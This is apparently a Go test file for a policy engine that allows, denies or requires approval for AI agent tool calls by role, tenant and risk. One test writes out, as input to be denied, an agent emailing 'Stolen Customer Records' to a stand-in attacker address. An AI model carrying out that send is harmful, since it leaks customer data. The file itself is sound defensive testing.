package policy

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func loadTestEngine(t *testing.T) *Engine {
	regoPath := filepath.Join("..", "..", "policies", "default.rego")
	code, err := os.ReadFile(regoPath)
	if err != nil {
		t.Fatalf("failed to read test rego policy: %v", err)
	}

	engine, err := NewEngine("v1.0.0", string(code))
	if err != nil {
		t.Fatalf("failed to initialize policy engine: %v", err)
	}
	return engine
}

func TestPolicy_ReaderRole_SearchDocs_Allowed(t *testing.T) {
	engine := loadTestEngine(t)
	ctx := context.Background()

	input := PolicyInput{}
	input.Identity.AgentID = "agent-reader-01"
	input.Identity.TenantID = "tenant-alpha"
	input.Identity.Role = "reader"
	input.Tool.ID = "search_docs"
	input.Tool.Risk = "low"
	input.Action.ResourceID = "kb-public"
	input.Action.Arguments = map[string]interface{}{
		"query":      "security policy",
		"dataset_id": "kb-public",
	}

	dec, err := engine.Evaluate(ctx, input)
	if err != nil {
		t.Fatalf("unexpected eval error: %v", err)
	}

	if dec.Decision != "ALLOW" {
		t.Fatalf("expected ALLOW for reader search_docs, got %s (reasons: %v)", dec.Decision, dec.Reasons)
	}
	if !dec.Allowed {
		t.Errorf("expected Allowed = true")
	}
}

func TestPolicy_ReaderRole_HighRisk_Denied(t *testing.T) {
	engine := loadTestEngine(t)
	ctx := context.Background()

	input := PolicyInput{}
	input.Identity.AgentID = "agent-reader-01"
	input.Identity.TenantID = "tenant-alpha"
	input.Identity.Role = "reader"
	input.Tool.ID = "export_data"
	input.Tool.Risk = "high"
	input.Action.Arguments = map[string]interface{}{
		"destination_url": "https://export.partner.com/dump",
	}

	dec, err := engine.Evaluate(ctx, input)
	if err != nil {
		t.Fatalf("unexpected eval error: %v", err)
	}

	if dec.Decision != "DENY" {
		t.Fatalf("expected DENY for reader calling export_data, got %s", dec.Decision)
	}
}

func TestPolicy_CrossTenant_Violation_Denied(t *testing.T) {
	engine := loadTestEngine(t)
	ctx := context.Background()

	input := PolicyInput{}
	input.Identity.AgentID = "agent-alpha"
	input.Identity.TenantID = "tenant-alpha"
	input.Identity.Role = "analyst"
	input.Tool.ID = "search_docs"
	input.Tool.Risk = "low"
	input.Action.ResourceID = "kb-tenant-beta" // Accessing Tenant Beta resource!
	input.Action.Arguments = map[string]interface{}{
		"dataset_id": "kb-tenant-beta",
	}

	dec, err := engine.Evaluate(ctx, input)
	if err != nil {
		t.Fatalf("unexpected eval error: %v", err)
	}

	if dec.Decision != "DENY" {
		t.Fatalf("expected DENY for cross-tenant resource access, got %s", dec.Decision)
	}

	hasTenantRule := false
	for _, r := range dec.RuleIDs {
		if r == "RULE_TENANT_MISMATCH" {
			hasTenantRule = true
			break
		}
	}
	if !hasTenantRule {
		t.Errorf("expected RULE_TENANT_MISMATCH in rule_ids, got %v", dec.RuleIDs)
	}
}

func TestPolicy_Exfiltration_UntrustedRecipient_Denied(t *testing.T) {
	engine := loadTestEngine(t)
	ctx := context.Background()

	input := PolicyInput{}
	input.Identity.AgentID = "agent-compromised"
	input.Identity.TenantID = "tenant-alpha"
	input.Identity.Role = "analyst"
	input.Tool.ID = "send_email"
	input.Tool.Risk = "high"
	input.Action.Arguments = map[string]interface{}{
		"to":      "exfiltrator@evil.hacker.com", // External attacker email!
		"subject": "Stolen Customer Records",
		"body":    "Confidential data dump...",
	}

	dec, err := engine.Evaluate(ctx, input)
	if err != nil {
		t.Fatalf("unexpected eval error: %v", err)
	}

	if dec.Decision != "DENY" {
		t.Fatalf("expected DENY for external email exfiltration, got %s", dec.Decision)
	}
}

func TestPolicy_Analyst_HighRisk_ApprovalRequired(t *testing.T) {
	engine := loadTestEngine(t)
	ctx := context.Background()

	input := PolicyInput{}
	input.Identity.AgentID = "agent-analyst-01"
	input.Identity.TenantID = "tenant-alpha"
	input.Identity.Role = "analyst"
	input.Tool.ID = "send_email"
	input.Tool.Risk = "high"
	input.Action.Arguments = map[string]interface{}{
		"to":      "compliance@company.internal", // Legitimate internal recipient
		"subject": "Quarterly Audit Report",
		"body":    "Report details...",
	}

	dec, err := engine.Evaluate(ctx, input)
	if err != nil {
		t.Fatalf("unexpected eval error: %v", err)
	}

	if dec.Decision != "APPROVE" {
		t.Fatalf("expected APPROVE for high-risk internal email, got %s (reasons: %v)", dec.Decision, dec.Reasons)
	}
	if !dec.RequiresApproval {
		t.Errorf("expected RequiresApproval = true")
	}
}

func TestPolicy_LatencyBenchmark(t *testing.T) {
	engine := loadTestEngine(t)
	ctx := context.Background()

	input := PolicyInput{}
	input.Identity.AgentID = "agent-analyst-01"
	input.Identity.TenantID = "tenant-alpha"
	input.Identity.Role = "analyst"
	input.Tool.ID = "search_docs"
	input.Tool.Risk = "low"
	input.Action.ResourceID = "kb-public"
	input.Action.Arguments = map[string]interface{}{"query": "benchmark"}

	// Warmup
	for i := 0; i < 5; i++ {
		engine.Evaluate(ctx, input)
	}

	// Measure 50 iterations
	var totalDuration time.Duration
	iterations := 50
	for i := 0; i < iterations; i++ {
		t0 := time.Now()
		_, err := engine.Evaluate(ctx, input)
		if err != nil {
			t.Fatalf("iteration %d failed: %v", i, err)
		}
		totalDuration += time.Since(t0)
	}

	avgLatency := totalDuration / time.Duration(iterations)
	t.Logf("Average embedded OPA policy latency: %v", avgLatency)

	// In-process OPA must be under 20ms p95 (usually < 1ms)
	if avgLatency > 20*time.Millisecond {
		t.Errorf("policy latency too slow: %v > 20ms", avgLatency)
	}
}
